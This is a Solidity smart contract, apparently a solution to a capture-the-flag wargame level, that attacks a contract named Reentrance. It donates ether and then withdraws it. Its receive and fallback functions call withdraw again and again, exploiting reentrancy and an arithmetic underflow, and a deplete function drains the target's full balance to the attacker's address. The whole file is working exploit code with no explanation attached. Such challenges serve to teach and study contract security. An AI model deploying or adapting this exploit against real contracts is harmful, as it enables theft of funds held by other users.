// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Reentrance.sol";

contract ReentranceHack {
    Reentrance target;
    address payable private _owner;
    uint256 private _amount;
    uint256 private _withdrawCalls;

    constructor(address payable _target) payable {
        target = Reentrance(_target);
        _owner = payable(msg.sender);
        _amount = msg.value;
    }

    function causeOverflow() public payable {
        _amount = address(this).balance;
        require(_amount > 0, "Send some ether.");
        _withdrawCalls = 2;
        target.donate{value: _amount}(address(this));
        target.withdraw(_amount);
    }

    function deplete() public {
        _withdrawCalls = 2;
        target.withdraw(address(target).balance);
        _owner.transfer(address(this).balance);
    }

    receive() external payable {
        if (_withdrawCalls > 0) {
            target.withdraw(_amount);
            _withdrawCalls = _withdrawCalls - 1;
        }
    }

    fallback() external payable {
        if (_withdrawCalls > 0) {
            target.withdraw(_amount);
            _withdrawCalls = _withdrawCalls - 1;
        }
    }
}
